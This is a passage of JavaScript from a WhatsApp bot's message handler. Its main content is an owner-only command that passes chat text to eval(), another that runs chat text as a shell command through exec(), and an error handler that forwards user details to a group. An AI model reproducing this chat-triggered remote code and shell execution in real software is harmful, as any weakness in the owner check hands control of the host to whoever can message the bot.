
if (budy.startsWith('<')) {
  if (!YutaTheCreator) return
  replygcyuta(`*[ sʏsᴛᴇᴍ ] Eval Exceling......*`)
  try {
    let evaled = await eval(budy.slice(2))
    if (typeof evaled !== 'string') evaled = require('util').inspect(evaled, {compact: true, depth: 50} )
    await m.reply(`${evaled}`)
  } catch (err) {
    //await replygcyuta(String(err))
    await m.reply(`EVAL ERROR\n ${err}`)
    console.log(`EVAL ERROR\n ${err}`)
    
  }
}

if (budy.startsWith('$')) {
  if (!YutaTheCreator) return
  replygcyuta(`*[ sʏsᴛᴇᴍ ] Cat Exceling......*`)
  exec(budy.slice(2), (err, stdout) => {
    if (err) return m.reply(`${err}`)
    if (stdout) return m.reply(`${stdout}`)
  })
}

if (isCmd && budy.toLowerCase() != undefined) {
  if (m.chat.endsWith('broadcast')) return
  if (m.isBaileys) return
  let msgs = global.db.data.database
  if (!(budy.toLowerCase() in msgs)) return
  Yuta.copyNForward(m.chat, msgs[budy.toLowerCase()], true, {quoted: m})
}

}

} catch (err) {
console.log(util.format(err))
let e = String(err)
//leo.sendMessage("120363234366202639@g.us", { text: "Hello developer, there seems to be an error, please fix it " + util.format(e), contextInfo:{ forwardingScore: 9999999, isForwarded: true}})
global.db.data.settings[botNumber].totalError += 1
var texerr = `\`THE BOT\`
 - TERJADI ERROR
 - Text : ${m.text}
 - User : ${m.pushName} | ${m.chat}
\n\n${util.format(err)}`
var texerr2 = `\`THE BOT\`\nTERJADI ERROR`
m.reply(texerr2)
if (m.sender === jidgroupnotif) return m.reply(util.format(err))
Yuta.sendMessage(jidgroupnotif, {text: texerr}, { quoted:m})
//nd.sendMessage("120363234366202639@g.us", { text: texerr })

if (e.includes("conflict")) return
if (e.includes("not-authorized")) return
if (e.includes("already-exists")) return
if (e.includes("rate-overlimit")) return
if (e.includes("Connection Closed")) return
if (e.includes("Timed Out")) return
if (e.includes("Value not found")) return
if (e.includes("Socket connection timeout")) return
    }
}
